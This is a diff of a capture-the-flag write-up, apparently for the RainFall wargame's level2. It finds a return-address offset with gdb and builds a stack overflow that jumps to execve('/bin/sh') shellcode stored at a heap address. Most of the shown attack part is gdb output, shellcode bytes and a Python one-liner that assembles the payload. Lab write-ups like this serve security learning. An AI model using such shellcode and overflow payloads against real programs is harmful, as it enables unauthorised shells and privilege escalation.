@@ -33,7 +33,7 @@ Starting program: ./level2
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
-"6A7c"
+"6Ac7"
 (gdb) info register eip
 eip            0x37634136       0x37634136
 The pattern shows the return address is overwritten starting at offset 80 bytes.
@@ -53,25 +53,19 @@ Shellcode (21 bytes):
 \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
 https://shell-storm.org/shellcode/files/shellcode-752.html
 
+Shellcode is raw machine instructions, which are a sequence of bytes meant to be executed in the exact order they appear.
+
 Final Exploit Command
-python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
 
 cat /tmp/exploit - | ./level2
-✅ What Happens?
+
+What Happens?
 The shellcode is stored in the heap at 0x0804a008.
-
 The return address is overwritten to jump there.
-
 When the function returns, execution jumps to our shellcode in the heap.
 
-We get a shell as user level3.
-
-From there, we can read the next password file.
-
 Example session:
-bash
-Copier
-Modifier
 level2@RainFall:~$ cat /tmp/exploit - | ./level2
 j
  XRh//shh/bin1̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
